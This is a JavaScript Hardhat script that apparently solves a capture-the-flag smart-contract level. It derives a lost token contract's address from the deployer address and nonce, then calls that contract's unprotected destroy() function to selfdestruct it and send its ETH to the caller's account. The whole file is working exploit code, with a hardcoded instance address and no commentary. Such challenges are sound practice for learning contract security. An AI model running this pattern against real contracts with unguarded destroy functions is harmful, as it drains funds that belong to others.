const { ethers } = require("hardhat");
const hre = require("hardhat");


async function solve(instance_address, account) {

       
    const SimpleToken = await ethers.getContractFactory("SimpleToken");
    
    // Determine the address the token contract was created at
    // kekkak256(...) nonce 1?

    const nonce = "0x01";
    const rlpEncoded = ethers.utils.RLP.encode([instance_address, nonce]);
    const contractAddress = ethers.utils.keccak256(rlpEncoded);
    const tokenAddress = `0x${contractAddress.slice(26)}`;
    console.log(tokenAddress);

    let simple_token = SimpleToken.attach(tokenAddress);

    console.log(`Token balance: ${await ethers.provider.getBalance(simple_token.address)}`);

    console.log('Recovering ETH');
    let tx = await simple_token.destroy(account.address);
    console.log('Waiting for 10 confirmations...');
    await tx.wait(10);

    console.log(`Token balance: ${await ethers.provider.getBalance(simple_token.address)}`);

    console.log('Success!');

}


async function main() {

    const [account] = await ethers.getSigners();
    console.log(`Account address: ${account.address}`);
    console.log('');

    instance_address = '0x5f248cD140AAF3f5Ff882A24bf0c8C057e3a3D46';

    await solve(instance_address, account);

}


main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
